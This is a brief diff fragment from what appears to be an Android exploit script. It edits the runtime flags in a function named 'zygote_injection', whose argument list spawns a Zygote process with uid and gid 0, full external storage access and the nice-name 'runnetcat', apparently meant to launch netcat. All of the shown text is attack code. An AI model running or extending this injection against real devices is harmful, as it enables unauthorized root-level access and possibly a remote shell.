@@ -110,7 +110,7 @@ zygote_injection() {
 --runtime-args
 --setuid=0
 --setgid=0
---runtime-flags=2049
+--runtime-flags=43267
 --mount-external-full
 --setgroups=3003
 --nice-name=runnetcat
